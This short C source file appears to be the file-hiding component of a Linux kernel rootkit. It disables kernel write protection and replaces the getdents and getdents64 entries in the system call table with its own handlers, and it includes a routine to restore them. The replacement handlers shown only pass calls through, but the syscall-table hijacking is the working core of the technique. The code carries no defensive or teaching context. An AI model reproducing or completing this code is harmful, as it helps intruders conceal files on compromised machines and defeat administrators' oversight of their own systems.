#include "filehide.h"
#include "hook.h"

asmlinkage long
g7_getdents(unsigned fd, struct linux_dirent __user *dirp, unsigned count)
{
    return sys_getdents(fd, dirp, count);
}

asmlinkage long
g7_getdents64(unsigned fd, struct linux_dirent64 __user *dirp, unsigned count)
{
    return sys_getdents64(fd, dirp, count);
}

void
hide_files(void)
{
    disable_protection();
    sys_call_table[__NR_getdents] = (unsigned long)g7_getdents;
    sys_call_table[__NR_getdents64] = (unsigned long)g7_getdents64;
    enable_protection();
}

void
unhide_files(void)
{
    disable_protection();
    sys_call_table[__NR_getdents] = (unsigned long)sys_getdents;
    sys_call_table[__NR_getdents64] = (unsigned long)sys_getdents64;
    enable_protection();
}
